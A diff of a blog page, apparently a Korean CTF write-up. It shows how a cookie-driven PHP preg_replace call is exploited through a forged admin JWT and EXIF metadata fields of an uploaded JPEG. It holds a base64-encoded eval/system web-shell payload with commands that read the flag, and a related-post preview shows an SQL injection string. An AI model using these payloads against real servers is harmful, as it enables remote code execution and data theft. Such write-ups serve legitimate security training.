-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if($body[&#39;admin&#39;]==true)&#123;
+      $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]);
+      preg_replace($$edit[0],$$edit[1],$$edit[2]);
+    &#125;</code></pre>
 <p>이 부분에 보면 쿠키 값의 admin이 true를 가질 때,</p>
 <p>edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다.</p>
 <p>처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해</p>
 <p>RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line"><span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line"><span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$Date = $infor[&#39;DateTimeOriginal&#39;];
+$Model = $infor[&#39;Model&#39;];
+$Make = $infor[&#39;Make&#39;];
+$size = round($infor[&#39;FileSize&#39;]/1024,1);</code></pre>
 <p>이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니,</p>
 <p>$model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로</p>
 <p>흘러가게 해주면 된다.</p>
 <p>세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서</p>
 <p>바꿔주면 된다. (아래 참고)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;jwt.php&quot;</span>;</span><br><span class="line"><span class="variable">$jwt</span> = <span class="keyword">new</span> jwt();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">        ‘admin’=&gt;’<span class="literal">true</span>’,</span><br><span class="line">        ‘iat’=&gt;time()</span><br><span class="line">));</span><br><span class="line">var_dump(<span class="variable">$token</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+require_once &quot;jwt.php&quot;;
+$jwt = new jwt();
+
+$token = $jwt-&gt;hashing(array(
+        ‘admin’=&gt;’true’,
+        ‘iat’=&gt;time()
+));
+var_dump($token);
+?&gt;</code></pre>
 <p>Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));<br>?cmd=ls &amp; ?cmd=/flag</p>
 
   
@@ -417,6 +606,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     <div class='footer'>
       
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a></div></section></div>
       
       
       
@@ -430,10 +627,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T18:00:28+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-23T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditFeb 23, 2020</p>
   </a>
 </div>
 
@@ -468,7 +665,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>zixem challenge Write up</p>
           <p class='content'>Site : https://www.zixem.altervista.org/SQLi/
 
-1. LEVEL-11id=0%20union%20select%201,version(),3;-...</p>
+1. LEVEL-1id=0%20union%20select%201,version(),3;--...</p>
         </a>
       
       
@@ -554,42 +751,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -725,6 +886,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1100,6 +1263,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
